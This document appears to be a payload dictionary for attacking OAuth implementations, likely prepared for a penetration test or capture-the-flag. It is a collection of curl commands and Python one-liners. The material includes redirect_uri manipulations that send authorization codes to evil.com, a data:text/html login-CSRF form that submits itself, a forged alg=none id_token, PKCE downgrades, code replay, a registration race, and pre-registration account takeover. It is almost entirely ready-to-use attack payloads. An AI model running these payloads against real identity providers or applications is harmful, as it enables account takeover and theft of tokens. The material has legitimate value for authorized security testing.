# Payload dictionary — the OAuth payloads by shape

Every payload names the request, the expected response, and what it proves.

## The state-binding payloads

```bash
# payload 1 — mismatched state
curl -i -b "$JAR" "$BASE/callback?code=ABC&state=DIFFERENT"
# expected: 400 state mismatch (falsifier) or 302 session (confirmation)

# payload 2 — cross-session state
curl -i -b "$JAR2" "$BASE/callback?code=ABC&state=$(cat s1.txt)"
# expected: 400 state mismatch (falsifier) or 302 session (confirmation)

# payload 3 — missing state
curl -i -b "$JAR" "$BASE/callback?code=ABC"
# expected: 400 (falsifier) or 302 session (confirmation — state not validated)

# payload 4 — empty state
curl -i -b "$JAR" "$BASE/callback?code=ABC&state="
# expected: 400 (falsifier) or 302 session (confirmation)

# payload 5 — reflected state
curl -i -b "$JAR" "$BASE/callback?code=ABC&state=<script>alert(1)</script>"
# expected: the callback page renders it unencoded (DOM sink)
```

## The redirect_uri payloads

```bash
# payload 1 — exact match (baseline)
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app/callback&response_type=code&state=XYZ"

# payload 2 — prefix
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app/callback/extra&response_type=code&state=XYZ"

# payload 3 — subdomain
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app.evil.com/callback&response_type=code&state=XYZ"

# payload 4 — path traversal
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app/callback/../redirect?to=https://evil.com&response_type=code&state=XYZ"

# payload 5 — parameter pollution
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app/callback&redirect_uri=https://evil.com&response_type=code&state=XYZ"

# payload 6 — localhost
curl -i "https://idp/authorize?client_id=APP&redirect_uri=http://localhost/callback&response_type=code&state=XYZ"

# payload 7 — open redirect chain
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app/redirect?to=https://evil.com&response_type=code&state=XYZ"
```

## The cookie-swap payloads

```bash
# payload 1 — the text/plain JSON login
curl -i -X POST "$IDP/api/login" \
  -H "Content-Type: text/plain" \
  -d '{"email":"attacker@domain","password":"attacker_password"}'

# payload 2 — the form-encoded JSON login (alternative delivery)
curl -i -X POST "$IDP/api/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d '{"email":"attacker@domain","password":"attacker_password"}'

# payload 3 — the data:text/html delivery URL
# the bot visits this URL; the form POSTs the JSON login
# data:text/html,<form method="POST" action="https://idp/api/login" enctype="text/plain"><input name='{"email":"attacker@domain","password":"attacker_password' value='"}'><input type="submit"></form><script>document.forms[0].submit()</script>
```

## The implicit-flow payloads

```bash
# payload 1 — response_type=token
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app/callback&response_type=token&state=XYZ&nonce=N"

# payload 2 — response_type=id_token
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app/callback&response_type=id_token&state=XYZ&nonce=N"

# payload 3 — hybrid code+token
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app/callback&response_type=code+token&state=XYZ&nonce=N"

# payload 4 — form_post
curl -i -X POST "https://idp/authorize" \
  -d "client_id=APP&redirect_uri=https://app/callback&response_type=token&response_mode=form_post&state=XYZ&nonce=N"
```

## The PKCE payloads

```bash
# payload 1 — no code_challenge
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app/callback&response_type=code&state=XYZ"

# payload 2 — code_challenge_method=plain
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app/callback&response_type=code&state=XYZ&code_challenge=PLAINTEXT&code_challenge_method=plain"

# payload 3 — wrong code_verifier
curl -i -X POST "https://idp/token" \
  -d "grant_type=authorization_code&code=ABC&client_id=APP&client_secret=SECRET&redirect_uri=https://app/callback&code_verifier=WRONG"

# payload 4 — S256 challenge
python3 -c "import secrets,hashlib,base64; v=secrets.token_urlsafe(64)[:128]; c=base64.urlsafe_b64encode(hashlib.sha256(v.encode()).digest()).rstrip(b'=').decode(); print(f'code_verifier={v}'); print(f'code_challenge={c}')"
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app/callback&response_type=code&state=XYZ&code_challenge=CHALLENGE&code_challenge_method=S256"
```

## The token-binding payloads

```bash
# payload 1 — exchange a code twice
curl -i -X POST "https://idp/token" -d "grant_type=authorization_code&code=ABC&client_id=APP&client_secret=SECRET&redirect_uri=https://app/callback"
curl -i -X POST "https://idp/token" -d "grant_type=authorization_code&code=ABC&client_id=APP&client_secret=SECRET&redirect_uri=https://app/callback"

# payload 2 — exchange with different redirect_uri
curl -i -X POST "https://idp/token" -d "grant_type=authorization_code&code=ABC&client_id=APP&client_secret=SECRET&redirect_uri=https://evil.com/callback"

# payload 3 — exchange as different client
curl -i -X POST "https://idp/token" -d "grant_type=authorization_code&code=ABC&client_id=B&client_secret=SECRET_B&redirect_uri=https://appB/callback"

# payload 4 — id_token alg=none
python3 -c "import base64,json; h=json.dumps({'alg':'none','typ':'JWT'}); p=json.dumps({'iss':'https://idp','sub':'victim','aud':'APP','exp':9999999999,'iat':0,'nonce':'N'}); print(base64.urlsafe_b64encode(h.encode()).rstrip(b'=').decode()+'.'+base64.urlsafe_b64encode(p.encode()).rstrip(b'=').decode()+'.')"
```

## The registration-race payloads

```bash
# payload 1 — the race
for i in $(seq 1 50); do
  curl -s -X POST "$BASE/api/register" \
    -H "Content-Type: application/json" \
    -d '{"email":"student@domain","password":"attacker_password"}' &
done
wait

# payload 2 — the duplicate registration (idempotency check)
curl -i -X POST "$BASE/api/register" -H "Content-Type: application/json" -d '{"email":"test@domain","password":"pass1"}'
curl -i -X POST "$BASE/api/register" -H "Content-Type: application/json" -d '{"email":"test@domain","password":"pass2"}'
```

## The account-linking payloads

```bash
# payload 1 — pre-register the target account
curl -i -X POST "$BASE/api/register" -H "Content-Type: application/json" -d '{"email":"student@domain","password":"attacker_password"}'

# payload 2 — the OAuth login lands on the pre-registered account
# the bot's OAuth login uses the same email — the linking is on email

# payload 3 — the linking-CSRF
# the victim's authorize URL is substituted with the attacker's
# the victim's local account is linked to the attacker's OAuth identity
```
